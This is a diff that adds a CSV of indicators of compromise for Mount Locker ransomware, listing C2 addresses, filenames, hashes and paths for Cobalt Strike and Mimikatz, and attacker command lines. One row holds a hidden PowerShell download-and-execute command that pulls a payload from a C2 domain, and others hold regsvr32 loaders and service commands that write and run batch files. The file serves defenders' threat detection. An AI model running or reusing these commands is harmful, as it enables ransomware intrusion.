@@ -1,0 +1,38 @@
+﻿Indicator_type,Data,Note
+Description,IoCs related to Mount Locker ransomware,https://news.sophos.com/en-us/2021/03/31/sophos-mtr-in-real-time-what-is-astro-locker-team/
+command,"C:\Windows\system32\cmd.exe"" /c powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://supercombinating[.]com:80/bug3')) ",
+command,"regsvr32  yesc64.dll /i:""/log:c"" ",
+command,"regsvr32  locker_64.dll /i:""/log:c"" ",
+command,regsvr32.exe /i c:\Users\<username>\Music\archs64.dll ,
+command,"regsvr32.exe /s ""C:\Users\<username>\AppData\Local\Temp\diloay.dll"" ",
+domain,104.244.42.129 ,C2 server
+domain,139.60.162.19 ,C2 server
+domain,143.110.185.84 ,C2 server
+domain,185.162.235.61 ,C2 server
+domain,206.189.56.140 ,C2 server
+domain,31.13.93.174 ,C2 server
+domain,31.13.93.35 ,C2 server
+domain,52.204.190.157 ,C2 server
+domain,felpojdhf8980.cyou ,C2 server
+domain,supercombinating.com ,C2 server
+filename,Keatuxnf.dll ,Cobalt Strike
+filename,locker_64.dll,Mount Locker ransomware
+filename,niicok.dll,Cobalt Strike
+filename,RecoveryManual.html,Ransom note 
+filepath,C:\inetpub\locker_64.dll,Mount Locker ransomware 
+filepath,C:\Users\<username>\AppData\Local\Temp\diloay.dll,Cobalt Strike
+filepath,C:\Users\<username>\AppData\Local\Temp\miavan32.dll,Cobalt Strike
+filepath,C:\Users\<username>\Music\x64\mimikatz.exe,Mimikatz 
+filepath,C:\Users\<username>\yesc64.dll,Mount Locker ransomware 
+filepath,C:\Windows\ar664hs.dll,Cobalt Strike
+filepath,C:\windows\locker_64.dll,Mount Locker ransomware 
+filepath,C:\Windows\SysWOW64\exploer.exe,Cobalt Strike
+scheduled task,C:\Users\<username>\AppData\Local\Google\Chrome\User Data\FileTypePolicies\archs64.dll,Name: updater 
+scheduled task,regsvr32.exe /i c:\Users\<username>\Music\archs64.dll,Name: regsvr32
+scheduled task,regsvr32.exe C:\Users\<username>\Music\archs64 regsvr32.exe /i ,Name: updater 
+service,"%COMSPEC% /C ""whoami""",Named with random 16-digit string
+service,"%COMSPEC% /C echo wmic logicaldisk get description,name ^> %SYSTEMDRIVE%\WINDOWS\Temp\CIrmjHmIzofVNjPd.txt > \WINDOWS\Temp\KmsVUcNomePVWphR.bat & %COMSPEC% /C start %COMSPEC% /C \WINDOWS\Temp\KmsVUcNomePVWphR.bat",Named with random 16-digit string
+service,%COMSPEC% /C echo whoami ^> ZSYSTEMDRIVE%\WINDOWS\Temp\pkLneFsUyHywlUwZ.txt > \WINDOWS\Temp\sloKuaTCIYlTTPwM.bat & %COMSPEC% /C start %COMSPEC% /C \WINDOWS\Temp\sloKuaTCIYlTTPwM.bat,Named with random 16-digit string
+sha256,30ff38e859a849b6776dd7b0f299ba83605858f661297f39585bcf928769feef,Cobalt Strike
+sha256,5606c92af263869268a11eb730eb32d5fd770896530b23e42d2390d6ef230d61,Mount Locker ransomware DLL
+sha256,864930113d66c413bab705e79add3659efa95126449bfad05abf99c6d7e8ae00,Cobalt Strike
